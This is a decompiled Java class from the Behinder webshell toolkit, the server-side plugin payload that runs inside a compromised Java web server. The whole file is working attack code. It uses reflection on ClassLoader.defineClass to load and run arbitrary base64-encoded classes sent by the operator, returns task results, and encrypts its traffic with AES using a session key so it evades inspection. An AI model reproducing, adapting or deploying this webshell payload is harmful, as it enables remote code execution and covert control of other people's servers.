package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;




public class Plugin
{
  public static String taskID;
  public static String action;
  public static String payload;
  private ServletRequest Request;
  private ServletResponse Response;
  private HttpSession Session;
  
  public boolean equals(Object obj) {
    PageContext page = (PageContext)obj;
    this.Session = page.getSession();
    this.Response = page.getResponse();
    this.Request = page.getRequest();
    page.getResponse().setCharacterEncoding("UTF-8");
    Map<String, String> result = new HashMap<>();
    if (action.equals("submit")) {

      
      ClassLoader classLoader = getClass().getClassLoader();
      Class<?> urlClass = ClassLoader.class;
      
      try {
        Method method = urlClass.getDeclaredMethod("defineClass", new Class[] { byte[].class, int.class, int.class });
        method.setAccessible(true);
        byte[] payloadData = base64decode(payload);
        Class payloadCls = (Class)method.invoke(classLoader, new Object[] { payloadData, Integer.valueOf(0), Integer.valueOf(payloadData.length) });
        Object payloadObj = payloadCls.newInstance();
        Method payloadMethod = payloadCls.getDeclaredMethod("execute", new Class[] { ServletRequest.class, ServletResponse.class, HttpSession.class });
        payloadMethod.invoke(payloadObj, new Object[] { this.Request, this.Response, this.Session });
        result.put("msg", "任务提交成功");
        result.put("status", "success");
      } catch (Exception e) {
        e.printStackTrace();
        result.put("msg", e.getMessage());
        result.put("status", "fail");
      } finally {

        
        try {
          
          ServletOutputStream so = this.Response.getOutputStream();
          so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
          so.flush();
          so.close();
          page.getOut().clear();
        } catch (Exception e) {
          
          e.printStackTrace();
        }
      
      }
    
    } else if (action.equals("getResult")) {
      
      try {
        Map<String, String> taskResult = (Map<String, String>)this.Session.getAttribute(taskID);
        
        Map<String, String> temp = new HashMap<>();
        temp.put("running", taskResult.get("running"));
        temp.put("result", base64encode(taskResult.get("result")));
        result.put("msg", buildJson(temp, false));
        result.put("status", "success");
      } catch (Exception e) {
        result.put("msg", e.getMessage());
        result.put("status", "fail");
      } finally {

        
        try {
          
          ServletOutputStream so = this.Response.getOutputStream();
          so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
          so.flush();
          so.close();
          page.getOut().clear();
        } catch (Exception e) {
          
          e.printStackTrace();
        } 
      } 
    } 
    return true;
  }

  
  private byte[] Encrypt(byte[] bs) throws Exception {
    String key = this.Session.getAttribute("u").toString();
    byte[] raw = key.getBytes("utf-8");
    SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
    cipher.init(1, skeySpec);
    byte[] encrypted = cipher.doFinal(bs);
    return encrypted;
  }
  
  private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
    StringBuilder sb = new StringBuilder();
    String version = System.getProperty("java.version");
    sb.append("{");
    for (String key : entity.keySet()) {
      
      sb.append("\"" + key + "\":\"");
      String value = ((String)entity.get(key)).toString();
      if (encode)
      {
        if (version.compareTo("1.9") >= 0) {
          
          getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
          Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
          value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
        }
        else {
          
          getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
          Object Encoder = Base64.newInstance();
          value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
          value = value.replace("\n", "").replace("\r", "");
        } 
      }

      
      sb.append(value);
      sb.append("\",");
    } 
    if (sb.toString().endsWith(","))
      sb.setLength(sb.length() - 1); 
    sb.append("}");
    return sb.toString();
  }
  
  private String base64encode(String clearText) throws Exception {
    String result = "";
    String version = System.getProperty("java.version");
    if (version.compareTo("1.9") >= 0) {
      
      getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
      Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
      result = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { clearText.getBytes("UTF-8") });
    }
    else {
      
      getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
      Object Encoder = Base64.newInstance();
      result = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { clearText.getBytes("UTF-8") });
      result = result.replace("\n", "").replace("\r", "");
    } 
    return result;
  }
  
  private byte[] base64decode(String base64Text) throws Exception {
    byte[] result;
    String version = System.getProperty("java.version");
    if (version.compareTo("1.9") >= 0) {
      
      getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
      Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
      result = (byte[])Decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(Decoder, new Object[] { base64Text });
    }
    else {
      
      getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Decoder");
      Object Decoder = Base64.newInstance();
      result = (byte[])Decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(Decoder, new Object[] { base64Text });
    } 
    return result;
  }
}


/* Location:              C:\Users\xxx\Downloads\Behinder_v3.0_Beta_6_win\Behinder_v3.0_Beta6_win.jar!\net\rebeyond\behinder\payload\java\Plugin.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */